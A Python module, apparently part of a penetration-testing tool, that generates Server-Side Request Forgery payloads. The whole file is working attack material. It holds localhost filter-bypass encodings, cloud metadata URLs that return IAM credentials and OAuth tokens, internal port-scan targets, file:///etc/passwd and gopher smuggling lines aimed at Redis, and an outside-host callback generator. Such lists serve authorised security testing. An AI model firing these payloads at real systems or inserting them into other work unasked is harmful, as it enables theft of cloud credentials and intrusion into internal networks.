"""
AIPT SSRF Payloads

Server-Side Request Forgery payloads for security testing.
"""
from __future__ import annotations

from typing import Iterator


class SSRFPayloads:
    """
    SSRF payload generator.

    Categories:
    - Localhost: 127.0.0.1 variations
    - Cloud metadata: AWS, GCP, Azure
    - Internal networks: Common RFC1918 ranges
    - Protocol smuggling: gopher, file, etc.

    Example:
        ssrf = SSRFPayloads()
        for payload in ssrf.localhost():
            test(f"/fetch?url={payload}")
    """

    @classmethod
    def localhost(cls) -> Iterator[str]:
        """Localhost bypass payloads"""
        payloads = [
            # Standard
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.0.0.1:8080",

            # IPv6
            "http://[::1]",
            "http://[0000::1]",

            # Alternative representations
            "http://127.1",
            "http://127.0.1",
            "http://2130706433",  # Decimal
            "http://0x7f000001",  # Hex
            "http://017700000001",  # Octal

            # Redirects
            "http://spoofed.burpcollaborator.net",

            # Enclosed brackets
            "http://[127.0.0.1]",

            # URL encoding
            "http://%31%32%37%2e%30%2e%30%2e%31",

            # With credentials
            "http://127.0.0.1@evil.com",
            "http://evil.com@127.0.0.1",

            # Domain confusion
            "http://127.0.0.1.evil.com",
            "http://127.0.0.1%00.evil.com",
            "http://127.0.0.1%09.evil.com",
        ]
        yield from payloads

    @classmethod
    def cloud_metadata(cls) -> Iterator[str]:
        """Cloud metadata service endpoints"""
        payloads = [
            # AWS
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",

            # GCP
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/",

            # Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token",

            # DigitalOcean
            "http://169.254.169.254/metadata/v1/",

            # Oracle Cloud
            "http://169.254.169.254/opc/v1/instance/",

            # Alibaba Cloud
            "http://100.100.100.200/latest/meta-data/",

            # Kubernetes
            "https://kubernetes.default.svc/",
            "https://kubernetes.default/",
        ]
        yield from payloads

    @classmethod
    def internal_networks(cls) -> Iterator[str]:
        """Internal network scanning payloads"""
        # Common internal IPs
        internal_ips = [
            "10.0.0.1",
            "10.0.0.254",
            "192.168.0.1",
            "192.168.1.1",
            "192.168.1.254",
            "172.16.0.1",
            "172.31.0.1",
        ]

        # Common internal ports
        ports = [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 9200]

        for ip in internal_ips:
            yield f"http://{ip}"
            for port in ports:
                yield f"http://{ip}:{port}"

    @classmethod
    def protocols(cls) -> Iterator[str]:
        """Protocol smuggling payloads"""
        payloads = [
            # File protocol
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "file://localhost/etc/passwd",

            # Gopher protocol (for internal service exploitation)
            "gopher://127.0.0.1:6379/_INFO",
            "gopher://127.0.0.1:11211/_stats",

            # Dict protocol
            "dict://127.0.0.1:6379/INFO",

            # LDAP
            "ldap://127.0.0.1",

            # FTP
            "ftp://127.0.0.1",
            "sftp://127.0.0.1",

            # SMB (Windows)
            "\\\\127.0.0.1\\c$",

            # Netdoc
            "netdoc:///etc/passwd",
        ]
        yield from payloads

    @classmethod
    def filter_bypass(cls) -> Iterator[str]:
        """Filter bypass techniques"""
        payloads = [
            # URL encoding
            "http://%31%32%37%2e%30%2e%30%2e%31",

            # Domain redirects (DNS rebinding setup required)
            "http://localtest.me",  # Resolves to 127.0.0.1
            "http://spoofed.burpcollaborator.net",

            # Short URL redirects
            "http://bit.ly/redirect-to-localhost",

            # Using @ for URL confusion
            "http://google.com@127.0.0.1",
            "http://127.0.0.1#@google.com",
            "http://127.0.0.1?@google.com",

            # Case variations
            "http://LOCALHOST",
            "http://LocalHost",

            # Dot variations
            "http://127。0。0。1",  # Full-width dots

            # CRLF injection
            "http://127.0.0.1%0d%0a",
        ]
        yield from payloads

    @classmethod
    def with_callback(cls, callback_url: str) -> Iterator[str]:
        """Payloads with external callback"""
        payloads = [
            callback_url,
            f"{callback_url}?ssrf=test",
            f"http://127.0.0.1@{callback_url.replace('http://', '')}",
        ]
        yield from payloads

    @classmethod
    def all(cls) -> Iterator[str]:
        """All SSRF payloads"""
        yield from cls.localhost()
        yield from cls.cloud_metadata()
        yield from cls.internal_networks()
        yield from cls.protocols()
        yield from cls.filter_bypass()
